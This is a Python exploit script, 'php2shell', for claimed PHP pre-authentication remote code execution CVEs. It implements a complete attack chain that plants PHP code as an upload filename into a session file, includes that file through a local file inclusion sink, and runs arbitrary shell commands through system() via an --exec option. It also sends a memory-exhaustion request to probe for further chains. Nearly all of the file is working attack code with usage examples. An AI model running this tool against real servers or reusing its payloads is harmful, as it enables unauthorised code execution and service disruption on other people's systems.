#!/usr/bin/env python3
"""
php2shell toolkit - CVE-2026-109618 / CVE-2026-109619
PHP pre-auth RCE via session.upload_progress + Zend engine OOM bailout.

CVSS v4.0 9.2 CRITICAL
Affected : PHP < 8.2.35 / < 8.3.36 / < 8.4.27 / < 8.5.12
Fixed    : 8.2.35, 8.3.36, 8.4.27, 8.5.12
Patch    : php-src commit 3584a98bda "Avoid state corruption via bailout"
Advisory : GHSA-w8hw-w9fx-j79w, GHSA-6wmf-4rv5-p3rp

--------------------------------------------------------------------------
ATTACK CHAINS (from public research, Qi Deng / 2026-10-21)
--------------------------------------------------------------------------
  A  session injection + LFI          pre-auth, needs an LFI sink        <- RCE
  B  var_destroy UAF -> handler overwrite   needs unserialize()         <- RCE
  C  handler mismatch -> __destruct    pre-auth, 2 serialize_handlers   <- RCE
  D  OOM -> stale EG()                 pre-auth, mod_php, NO conditions
  E  FPM session OOM -> stale BG()     pre-auth, needs session_start()

This file implements CHAIN A (fully working, no memory corruption) plus
version/vector detection for D and E.

--------------------------------------------------------------------------
WHY CHAIN A WORKS
--------------------------------------------------------------------------
session.upload_progress.enabled is On by default. During request startup
(before any application code) PHP parses the multipart body and writes the
upload filename verbatim into the session file:

    upload_progress_<key>|a:5:{...s:4:"name";s:<len>:"<RAW FILENAME>";...}

The filename is not sanitised, so a PHP payload lands on disk inside
/tmp/sess_<sid>. If the application has any include/require sink, pointing
it at that file executes the payload. The PHPSESSID can be supplied as a
form field, so the attacker controls the session file name.

The 8.4.27 patch adds PS(in_rfc1867_update) and forces "incomplete classes
only" during upload-progress decode, which is exactly this path.

--------------------------------------------------------------------------
LEGAL
--------------------------------------------------------------------------
Use only against systems you are authorised to test. --exec runs commands
on the target.
"""
import argparse
import http.client
import os
import random
import re
import socket
import ssl
import string
import sys
import time
import urllib.parse

BANNER = "php2shell toolkit  CVE-2026-109618 / CVE-2026-109619  (chain A RCE + detection)"

FIXED = [(8, 2, 35), (8, 3, 36), (8, 4, 27), (8, 5, 12)]
OOM_MARKERS = ("allowed memory size", "exhausted", "input variables exceeded",
               "php request startup", "fatal error")


# ---------------------------------------------------------------- transport

def parse_target(url):
    m = re.match(r"(https?)://([^/:]+)(?::(\d+))?(/.*)?$", url)
    if not m:
        sys.exit("invalid URL")
    scheme, host, port, path = m.group(1), m.group(2), m.group(3), m.group(4) or "/"
    tls = scheme == "https"
    return tls, host, int(port or (443 if tls else 80)), path


def connect(host, port, tls, timeout=20):
    s = socket.create_connection((host, port), timeout=timeout)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    return s


def read_response(sock, timeout=20, cap=400_000):
    sock.settimeout(timeout)
    buf = b""
    while b"\r\n\r\n" not in buf:
        c = sock.recv(65536)
        if not c:
            return buf
        buf += c
        if len(buf) > cap:
            return buf
    head, rest = buf.split(b"\r\n\r\n", 1)
    m = re.search(rb"Content-Length:\s*(\d+)", head, re.I)
    if m:
        need = int(m.group(1))
        while len(rest) < need:
            c = sock.recv(65536)
            if not c:
                break
            rest += c
        return head + b"\r\n\r\n" + rest
    if re.search(rb"Transfer-Encoding:\s*chunked", head, re.I):
        data = rest
        while not data.endswith(b"0\r\n\r\n"):
            c = sock.recv(65536)
            if not c:
                break
            data += c
            if len(data) > cap:
                break
        return head + b"\r\n\r\n" + data
    return head + b"\r\n\r\n" + rest


def http_req(host, port, tls, raw, timeout=20):
    s = connect(host, port, tls, timeout)
    try:
        s.sendall(raw if isinstance(raw, bytes) else raw.encode())
        return read_response(s, timeout)
    finally:
        s.close()


def status_of(raw):
    parts = raw.split(b"\r\n", 1)[0].split()
    return parts[1].decode() if len(parts) > 1 else "?"


def body_of(raw):
    return raw.split(b"\r\n\r\n", 1)[-1].decode("latin-1", "replace")


# ---------------------------------------------------------------- detection

def fingerprint(host, port, tls, path="/"):
    raw = http_req(host, port, tls, (
        f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
        "User-Agent: php2shell/2.0\r\nAccept: */*\r\nConnection: close\r\n\r\n"))
    head = raw.split(b"\r\n\r\n", 1)[0].decode("latin-1", "replace")
    php = re.search(r"X-Powered-By:\s*PHP/([\d.]+)", head, re.I)
    srv = re.search(r"Server:\s*([^\r\n]+)", head, re.I)
    return (srv.group(1).strip() if srv else "?"), (php.group(1) if php else None), head


def is_vuln(ver):
    v = tuple(int(x) for x in ver.split("."))
    return any(v[:2] == f[:2] and v < f for f in FIXED)


def detect_sapi(headers_text):
    s = headers_text.lower()
    if "apache" in s:
        return "apache (mod_php?)"
    if "php-fpm" in s or "fpm" in s:
        return "fpm"
    return "unknown"


# ---------------------------------------------------------------- chain A

def build_upload(path, host, sid, payload, boundary, stall=None):
    """Multipart that plants `payload` as the upload filename."""
    part = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{payload}"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
    ).encode("latin-1")
    data = part + (b"Z" * (stall or 64))
    total = len(data) + (100000 if stall else 0)
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {total}\r\n"
        f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n"
    ).encode() + data


def plant(host, port, tls, path, sid, payload, stall=None, timeout=25):
    b = "----" + "".join(random.choices(string.ascii_lowercase, k=12))
    raw = build_upload(path, host, sid, payload, b, stall)
    if stall:
        # keep the socket open so cleanup=On does not delete the entry yet
        s = connect(host, port, tls, timeout)
        s.sendall(raw)
        return s
    return http_req(host, port, tls, raw, timeout)


def lfi_fetch(host, port, tls, lfi_path, target_file, sid, timeout=20):
    q = urllib.parse.urlencode({"page": target_file})
    sep = "&" if "?" in lfi_path else "?"
    raw = (f"GET {lfi_path}{sep}{q} HTTP/1.1\r\nHost: {host}\r\n"
           f"Cookie: PHPSESSID={sid}\r\nUser-Agent: php2shell/2.0\r\n"
           "Connection: close\r\n\r\n")
    return http_req(host, port, tls, raw, timeout)


def chain_a(args):
    tls, host, port, _ = parse_target(args.url)
    sid = args.sid or ("php2shell" + "".join(random.choices(string.hexdigits.lower()[:16], k=16)))
    sess_file = args.session_path.rstrip("/") + "/sess_" + sid

    marker = "".join(random.choices(string.ascii_lowercase, k=8))
    if args.exec:
        php = "<?php echo '%s'; system('%s'); echo '%s'; ?>" % (
            marker, args.exec.replace("'", "'\"'\"'"), marker)
    else:
        php = "<?php echo '%s'; echo 'PHP2SHELL_OK'; echo '%s'; ?>" % (marker, marker)

    print(f"[*] target      : {host}:{port} tls={tls}")
    print(f"[*] inject      : {args.inject_path}")
    print(f"[*] lfi         : {args.lfi_path}")
    print(f"[*] session file: {sess_file}")
    print(f"[*] sid         : {sid}")
    print(f"[*] payload     : {php[:70]}...")

    for attempt in range(1, args.attempts + 1):
        sock = None
        try:
            if args.cleanup_on:
                sock = plant(host, port, tls, args.inject_path, sid, php, stall=5120)
                time.sleep(args.delay)
            else:
                r = plant(host, port, tls, args.inject_path, sid, php)
                print(f"    plant: HTTP {status_of(r)}")

            resp = lfi_fetch(host, port, tls, args.lfi_path, sess_file, sid)
            body = body_of(resp)
            print(f"    lfi  : HTTP {status_of(resp)} ({len(body)}b)")

            if marker in body or "PHP2SHELL_OK" in body:
                print("\n[+] RCE CONFIRMED")
                start = body.find(marker)
                chunk = body[start + len(marker):].replace(marker, "")
                print("    output:", chunk.strip()[:500] or "(echo only)")
                return True
            snippet = body.strip().replace("\n", " ")[:160]
            print(f"    miss : {snippet}")
        except Exception as e:
            print(f"    error: {e}")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
        time.sleep(0.2)

    print("\n[-] not confirmed. Check: LFI path correct? session.save_path correct?")
    print("    Common paths: /tmp, /var/lib/php/sessions, /var/lib/php/sess_*")
    return False


# ---------------------------------------------------------------- chain D/E detect

def build_oom_vector(nvars=1000, levels=63):
    unit = "a[]" + "[b]" * levels + "=c"
    return ("&".join([unit] * nvars)).encode()


def check_oom(args):
    """Trigger the OOM path during request startup (Chain D/E precondition)."""
    tls, host, port, path = parse_target(args.url)
    srv, ver, head = fingerprint(host, port, tls, path)
    print(f"[*] server     : {srv}")
    print(f"[*] php        : {'PHP/' + ver if ver else 'hidden'}")
    print(f"[*] sapi guess : {detect_sapi(head)}")
    if ver:
        print(f"[*] version    : {'VULNERABLE' if is_vuln(ver) else 'patched'}")
    else:
        print("[*] version    : undetermined (X-Powered-By hidden)")

    body = build_oom_vector(args.vars, args.levels)
    print(f"[*] oom vector : {args.vars} vars x depth {args.levels} ({len(body)/1048576:.2f} MB)")
    raw = http_req(host, port, tls, (
        f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
        "User-Agent: php2shell/2.0\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode() + body, timeout=args.timeout)

    text = body_of(raw).lower()
    hits = [m for m in OOM_MARKERS if m in text]
    print(f"[*] response   : HTTP {status_of(raw)}")
    if hits:
        print(f"[+] OOM during request startup: {', '.join(hits)}")
        print("    => CVE-2026-109618 precondition reached (mod_php shutdown will")
        print("       process the invalid state). Chain D target.")
        return True
    print("[-] no OOM marker (limit not reached / WAF / body cap)")
    return False


# ---------------------------------------------------------------- main

def main():
    ap = argparse.ArgumentParser(description=BANNER, formatter_class=argparse.RawDescriptionHelpFormatter,
                                 epilog="examples:\n"
                                        "  # version + OOM precondition\n"
                                        "  python3 php2shell.py check https://target/\n"
                                        "  # chain A: prove code execution via LFI\n"
                                        "  python3 php2shell.py chainA https://target/ --lfi-path /vuln.php --session-path /tmp\n"
                                        "  # chain A with a command\n"
                                        "  python3 php2shell.py chainA https://target/ --lfi-path /vuln.php --exec 'id'\n")
    sub = ap.add_subparsers(dest="cmd", required=True)

    c = sub.add_parser("check", help="fingerprint + OOM precondition (read-only)")
    c.add_argument("url")
    c.add_argument("--vars", type=int, default=1000)
    c.add_argument("--levels", type=int, default=63)
    c.add_argument("--timeout", type=int, default=60)
    c.set_defaults(func=check_oom)

    a = sub.add_parser("chainA", help="session.upload_progress injection + LFI -> RCE")
    a.add_argument("url")
    a.add_argument("--inject-path", default="/index.php")
    a.add_argument("--lfi-path", required=True)
    a.add_argument("--session-path", default="/tmp")
    a.add_argument("--sid", default="")
    a.add_argument("--exec", default="", help="command to run (omit for echo-only proof)")
    a.add_argument("--cleanup-on", action="store_true",
                   help="race session.upload_progress.cleanup=On with a stalled writer")
    a.add_argument("--delay", type=float, default=0.05)
    a.add_argument("--attempts", type=int, default=3)
    a.set_defaults(func=chain_a)

    args = ap.parse_args()
    print(BANNER)
    print()
    ok = args.func(args)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
